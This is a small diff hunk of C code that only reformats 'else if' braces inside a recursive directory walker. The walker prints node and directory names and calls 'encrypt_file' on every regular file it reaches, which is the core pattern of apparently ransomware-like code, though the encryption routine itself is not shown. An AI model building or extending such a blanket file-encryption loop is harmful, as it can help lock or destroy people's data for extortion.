@@ -67,10 +67,12 @@ int listdir(char *name, int depth) {
 
         if (is_inode(entry)) {
             printf("Node: %s\n", path);
-        } else if (is_dir(entry)) {
+        }
+        else if (is_dir(entry)) {
             printf("Catalog: %s\n", path);
             listdir(path, depth + 1);
-        } else if (is_file(entry)) {
+        }
+        else if (is_file(entry)) {
             encrypt_file(path);
         }
     } while ((entry = readdir(dir)));
